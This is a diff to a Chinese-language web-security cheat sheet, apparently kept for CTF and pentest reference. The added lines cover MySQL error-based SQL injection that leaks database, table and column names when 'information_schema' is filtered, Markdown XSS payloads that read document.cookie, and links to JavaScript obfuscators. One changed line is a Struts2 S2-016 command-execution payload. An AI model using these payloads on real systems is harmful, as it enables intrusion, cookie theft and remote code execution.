@@ -649,6 +649,7 @@ pop graphic-context
     - `#`
     - `--`
     - `/**/`
+        - 一個`*/`可以閉合前面多個`/*`
     - `/*! 50001 select * from test */`
         - 可探測版本
         - e.g. `SELECT /*!32302 1/0, */ 1 FROM tablename`
@@ -738,7 +739,19 @@ pop graphic-context
         - `select GTID_SUBSET(version(),1);`
         - `select GTID_SUBTRACT(version(),1);`
         - `select ST_PointFromGeoHash(version(),1);`
-
+    - 爆庫名、表名、字段名
+        - 當過濾`information_schema`等關鍵字時，可以用下面方法爆庫名
+            - `select 1,2,3 from users where 1=abc();`
+                - `ERROR 1305 (42000): FUNCTION fl4g.abc does not exist`
+        - 爆表名
+            - `select 1,2,3 from users where Polygon(id);`
+            - ``select 1,2,3 from users where linestring(id);``
+                - ```ERROR 1367 (22007): Illegal non geometric '`fl4g`.`users`.`id`' value found during parsing```
+        - 爆Column
+            - `select 1,2,3 from users where (select * from  (select * from users as a join users as b)as c);`
+                - `ERROR 1060 (42S21): Duplicate column name 'id'`
+            - `select 1,2,3 from users where (select * from  (select * from users as a join users as b using(id))as c);`
+                - `ERROR 1060 (42S21): Duplicate column name 'username'`
 - Blind Based (Time/Boolean)
     - Boolean
         - 「有」跟「沒有」
@@ -1587,7 +1600,7 @@ http://[::]
     - Struts2
         - S2-016
             - `action:`、`redirect:`、`redirectAction:`
-            - `index.do?redirect:${new java.lang.ProcessBuilder(‘id’).start()}`
+            - `index.do?redirect:${new java.lang.ProcessBuilder('id').start()}`
     - ElasticSearch
         - default port: `9200`
     - Redis
@@ -1845,6 +1858,22 @@ xxe.dtd:
     - `alert.call(null,document.domain);`
     - `alert.bind()(document.domain);`
     - https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309
+
+- Markdown XSS
+    - `[a](javascript:prompt(document.cookie))`
+    - `[a](j a v a s c r i p t:prompt(document.cookie))`
+    - `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`
+    - ...
+
+## Online Encoding / Decoding
+    - http://monyer.com/demo/monyerjs/
+
+## JSFuck
+    - http://www.jsfuck.com/
+
+## aaencode / aadecode
+    - http://utf-8.jp/public/aaencode.html
+    - https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html
 
 # 密碼學
 
